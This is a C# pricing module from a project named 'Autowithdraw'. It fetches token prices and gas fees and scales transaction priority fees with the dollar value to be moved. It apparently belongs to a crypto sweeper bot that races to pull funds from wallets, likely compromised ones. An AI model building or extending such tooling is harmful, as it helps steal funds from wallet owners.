using Autowithdraw.Global.Common;
using Autowithdraw.Global.Objects;
using Nethereum.Util;
using Nethereum.Web3;
using System;
using System.Collections.Generic;
using System.IO;
using System.Numerics;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace Autowithdraw.Global
{
    internal class Pricing
    {
        public static async Task<BigInteger> GetGwei(int ChainID)
        {
            BigInteger ExtraWei = (Settings.Chains[ChainID].LowGwei ? 0 : (ChainID == 137 ? BigInteger.Parse("15000000000") : BigInteger.Parse("1000000000")));

            // Дополнительные веи для каждой сети

            return await Settings.Chains[ChainID].Web3.Eth.GasPrice.SendRequestAsync() + ExtraWei;
        }

        public static async Task<BigInteger> GetFee(BigInteger GasLimit, int ChainID) => GasLimit * await GetGwei(ChainID);
        public static float GetEther(float Amount, int ChainID) => Amount / Settings.Chains[ChainID].Price;
        public static float GetPriceEther(BigInteger Wei, int ChainID) => Settings.Chains[ChainID].Price * (float)Web3.Convert.FromWei(Wei);
        public static float GetPrice(BigInteger Wei, int ChainID) => float.Parse($"{Settings.Chains[ChainID].Price * (float)Web3.Convert.FromWei(Wei):f1}");

        public static string GetEmoji(float Price, bool Deleted = false) =>
            (Price >= 15000 ? "💰💰💰💰💰💰💰+" :
                Price >= 8000 ? "💰💰💰💰💰💰💰" :
                Price >= 5000 ? "💰💰💰💰💰💰+" :
                Price >= 4500 ? "💰💰💰💰💰💰" :
                Price >= 3500 ? "💰💰💰💰💰+" :
                Price >= 2800 ? "💰💰💰💰💰" :
                Price >= 2000 ? "💰💰💰💰+" :
                Price >= 1500 ? "💰💰💰💰" :
                Price >= 1200 ? "💰💰💰+" :
                Price >= 1000 ? "💰💰💰" :
                Price >= 800 ? "💰💰+" :
                Price >= 500 ? "💰💰" :
                Price >= 300 ? "💰+" :
                Price >= 150 ? "💰" :
                Price >= 100 ? "💵+" : "💵").Replace(Deleted ? "💰" : "None", "💸").Replace(Deleted ? "💵" : "None", "💸");

        public static int EventsStaking = 0;

        public static async Task<BigInteger> GetPriority(
            float Price,
            int ChainID,
            BigInteger Gas)
        {
            float Dollars;
            if (Price > 10000)
                Dollars = 10 + EventsStaking;
            else if (Price > 1000)
                Dollars = 5 + EventsStaking;
            else if (Price > 300)
                Dollars = 3 + EventsStaking / 2;
            else if (Price > 100)
                Dollars = 0.90f;
            else
                Dollars = 0.60f;
            return ((await Settings.Chains[ChainID].Web3.Eth.GasPrice.SendRequestAsync()).Value + Web3.Convert.ToWei(Dollars / Settings.Chains[ChainID].Price)) / Gas;
        }

        public static bool ValidPrice(
            int ChainID,
            string Address,
            string ContractAddress,
            BigDecimal Wei,
            BigDecimal BalanceWei,
            BigDecimal Decimals,
            string Name,
            out float Price,
            out float Ether,
            out BigInteger TrueWei,
            bool isNotification = false,
            bool updatePrice = true)
        {
            float Parsed;
            Ether = (float)(Wei / Decimals);
            TrueWei = Cast.GetInteger(Wei / Decimals * Decimals) - 1;

            if (Settings.Prices.ContainsKey(ContractAddress))
            {
                Parsed = Settings.Prices[ContractAddress];
                if (updatePrice)
                    new Thread(() => UpdateTokenPrice(ContractAddress, Decimals, ChainID)).Start();
            }
            else
                Parsed = UpdateTokenPrice(ContractAddress, Decimals, ChainID);

            Price = float.Parse($"{Parsed * Ether:f1}");

            if (Price < Settings.Config.Other.Minimum || (ChainID == 1 && Price < 30) || double.IsInfinity(Price))
            {
                Ether = (float)(BalanceWei / Decimals);
                Price = float.Parse($"{Parsed * Ether:f1}");
                TrueWei = Cast.GetInteger(BalanceWei / Decimals * Decimals) - 1;
            }

            //if (updatePrice)
                Logger.Debug($"{Address} ({ContractAddress}) {Ether} - {Price}$", ConsoleColor.DarkGray);
            if (isNotification)
                return Price >= Settings.Config.Other.Minimum;
            return (Price >= 6 || (Name ?? "null").Contains("LP")) && Wei != 0;
        }

        public static float UpdateTokenPrice(
            string ContractAddress,
            BigDecimal Decimals,
            int ChainID)
        {
            float Parsed;
            try
            {
                if (ChainID == 56)
                {
                    var pancakeSwap =
                        Network.Get<Dictionary<string, Dictionary<string, float>>>($"https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses={ContractAddress}&vs_currencies=usd");
                    Parsed = pancakeSwap[ContractAddress.ToLower()]["usd"];
                }
                else if (ChainID == 128)
                {
                    var coingecko =
                        Network.Get<Dictionary<string, Dictionary<string, float>>>(
                            $"https://api.coingecko.com/api/v3/simple/token_price/huobi-token?contract_addresses={ContractAddress}&vs_currencies=usd");
                    Parsed = coingecko[ContractAddress.ToLower()]["usd"];
                }
                else
                {
                    if (ChainID == 10001)
                        ChainID = 1;
                    if (ContractAddress == Web3.ToChecksumAddress(Settings.Chains[ChainID].USDT))
                        Parsed = 1;
                    else
                    {
                        var inchSwap =
                            Network.Get<InchSwap>(
                                $"https://api.1inch.exchange/v4.0/{ChainID}/quote?fromTokenAddress={ContractAddress}&toTokenAddress={Settings.Chains[ChainID].USDT}&amount={Decimals}");
                        Parsed = (float)(int.Parse(inchSwap.toTokenAmount) / (double)Settings.Chains[ChainID].Decimals);
                    }
                }
            }
            catch
            {
                Parsed = 0;
            }

            if (Parsed != 0)
            {
                try
                {
                    Settings.Prices[ContractAddress] = Parsed;
                    File.WriteAllText("tokensPrices.json", JsonSerializer.Serialize(Settings.Prices, new JsonSerializerOptions
                    {
                        WriteIndented = true
                    }));
                }
                catch
                {
                    // ignored
                }
            }
            return Parsed;
        }
    }
}
